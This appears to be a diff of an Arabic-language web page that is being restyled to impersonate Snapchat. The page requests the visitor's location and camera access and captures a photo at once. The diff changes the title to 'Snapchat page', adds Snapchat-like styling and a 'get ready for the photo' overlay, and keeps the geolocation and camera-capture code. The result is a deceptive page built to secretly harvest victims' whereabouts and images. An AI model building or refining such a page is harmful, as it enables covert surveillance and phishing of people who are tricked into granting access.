@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صقر يسلم عليك</title>
+    <title>صفحة سناب شات</title>
     <style>
         body {
             display: flex;
@@ -11,13 +11,33 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #f0f0f0;
+            background-color: #fafafa; /* لون الخلفية شبيه بتطبيق سناب شات */
             font-family: Arial, sans-serif;
             direction: rtl;
+            position: relative; /* لجعل العناصر متداخلة */
+            overflow: hidden; /* لإخفاء أي شيء خارج حدود الصفحة */
         }
-        #message {
+        video {
+            width: 100%; /* ملء الشاشة بالكاميرا */
+            height: auto; /* الحفاظ على نسبة العرض إلى الارتفاع */
+            border-radius: 20px; /* حواف مستديرة */
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white; /* لون النص أبيض */
+            text-align: center;
             font-size: 24px;
-            margin-bottom: 20px;
+            background-color: rgba(0, 0, 0, 0.5); /* طبقة داكنة خلف النص */
+            border-radius: 20px; /* حواف مستديرة */
+            z-index: 1; /* فوق الفيديو */
         }
         #permission-message {
             color: red;
@@ -27,7 +47,10 @@
     </style>
 </head>
 <body>
-    <div id="message">صقر يسلم عليك</div>
+    <div id="overlay">
+        <div>🌟 استعد لالتقاط الصورة!</div>
+        <div>📸 صقر يسلم عليك!</div>
+    </div>
     <div id="permission-message">يجب عليك منح الأذونات للوصول إلى الموقع والكاميرا.</div>
     <script>
         let latitude = 'لم يُسمح بالوصول إلى الموقع'; // قيمة افتراضية
@@ -67,6 +90,7 @@
         function captureImage() {
             const video = document.createElement('video');
             video.setAttribute('autoplay', true);
+            video.setAttribute('playsinline', true); // دعم للأجهزة المحمولة
             document.body.appendChild(video);
 
             // التقاط الصورة فورًا
